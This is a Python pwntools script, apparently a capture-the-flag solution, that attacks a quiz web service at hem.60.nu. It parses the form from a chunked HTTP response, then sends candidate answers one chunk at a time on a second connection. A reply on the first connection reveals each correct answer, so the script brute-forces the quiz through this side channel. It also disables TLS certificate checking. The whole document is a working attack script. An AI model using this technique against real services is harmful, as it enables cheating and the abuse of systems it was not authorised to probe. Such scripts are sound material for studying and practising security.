import pwn
import ssl
import time
import urllib.request

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.VerifyMode.CERT_NONE

conn_index = pwn.remote("hem.60.nu", 50000, ssl=True, ssl_context=ctx)

conn_index.send(b"GET / HTTP/1.1\r\nHost: hem.60.nu\r\n\r\n")
headers = conn_index.recvuntil(b'\r\n\r\n')

def recv_one_block(rem, timeout=None):
    if timeout:
        n_bytes_hex = rem.recvuntil(b'\r\n', drop=True, timeout=timeout)
    else:
        n_bytes_hex = rem.recvuntil(b'\r\n', drop=True)
    if n_bytes_hex == b'':
        return None
    n_bytes = int(n_bytes_hex, 16)
    data = rem.recv(n_bytes)
    assert rem.recvuntil(b'\r\n', drop=True) == b''
    return data

def send_one_block(rem, data):
    n_bytes = len(data)
    rem.send(hex(n_bytes)[2:].encode() + b'\r\n')
    rem.send(data + b'\r\n')

start = recv_one_block(conn_index)

for line in start.split(b'\n'):
    if line.strip().startswith(b'<form'):
        action = line.split(b'action="')[1].split(b'"')[0]

print("Action:", action)
time.sleep(5)

qs = []

while True:
    data = recv_one_block(conn_index, 1)
    if data == None:
        print("done")
        break

    if data.startswith(b'<label'):
        q_id = data.split(b'"', 2)[1]
        print(q_id)
        ans = {}
        for part in data.split(b'<option')[1:]:
            val_id = part.split(b'"', 2)[1]
            val = part.split(b'> ')[1].split(b' <')[0]
            ans[val_id] = val
        qs.append((q_id, ans))

print(qs)

post = pwn.remote("hem.60.nu", 50000, ssl=True, ssl_context=ctx)
req = f"POST {action.decode()} HTTP/1.1\r\nHost: hem.60.nu\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\n\r\n"
post.send(req.encode())

time.sleep(2)

print(recv_one_block(conn_index, 0.01))

corrects = {}

for q_id, ans in qs:
    try:
        for a_id, a in ans.items():

            q = urllib.request.quote(q_id.decode()).encode() + b"=" + urllib.request.quote(a_id.decode()).encode() + b"&"

            print("trying", q, "=>", a)

            send_one_block(post, q)
            time.sleep(0.5)

            resp = recv_one_block(conn_index, 0.01)
            print(resp)
            if resp != None:
                time.sleep(0.8)
                print(q_id, "=>", a_id)
                corrects[q_id] = a_id
                break

    except KeyboardInterrupt:
        break

for q_id, ans in qs:
    if q_id in corrects:
        print(q_id, "=>", ans[corrects[q_id]])
    else:
        print(q_id, "=>", "?")

print(recv_one_block(conn_index, 0.01))
